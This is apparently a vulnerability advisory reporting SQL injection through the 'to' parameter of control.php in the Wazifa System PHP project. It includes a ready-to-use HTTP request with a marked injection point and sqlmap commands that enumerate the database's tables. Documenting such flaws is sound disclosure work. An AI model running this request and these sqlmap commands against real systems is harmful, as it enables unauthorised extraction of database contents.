# Wazifa System IN PHP control.php has SQL injection vulnerability

## supplier

https://code-projects.org/wazifa-system-in-php-css-js-and-mysql-free-download/

## Vulnerability file

/controllers/control.php

## describe

There is an unrestricted SQL injection attack in the collegeproject-wazifa system. The controllable parameter is: to. Pass to the function that has an unlimited SQL injection vulnerability to execute. A malicious attacker can exploit this vulnerability to obtain sensitive database information

## code analysis

The to parameter in the control.php can be controlled and executed in an unrestricted SQL statement.

You can see that the to is obtained and passed to getuserinfobyusername,and the funtion has sql injection vulnerable.

![image-20241102030154786](https://github.com/user-attachments/assets/3e5c1366-e5b6-4229-9b78-98a860cf671f)

![image-20241102030216689](https://github.com/user-attachments/assets/dd38f6e9-3430-4fbc-bb5a-b43cad596b75)



## POC

```
POST /controllers/control.php/ HTTP/1.1
Host: collegeproject-wazifa
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 32
Origin: http://collegeproject-wazifa
Connection: close
Referer: http://collegeproject-wazifa/controllers/control.php/
Upgrade-Insecure-Requests: 1
Priority: u=0, i

send=1&to=1*&subject=1&messege=1
```

save as 1.txt and excute this command

```
python sqlmap.py -r 1.txt --tables -D wazifa
```

Get tables from wazifa databases

![image-20241102025916610](https://github.com/user-attachments/assets/17e35e06-c6ce-41dd-bb2f-a6e25adc00b4)

```
python sqlmap.py -r 1.txt --tables
```

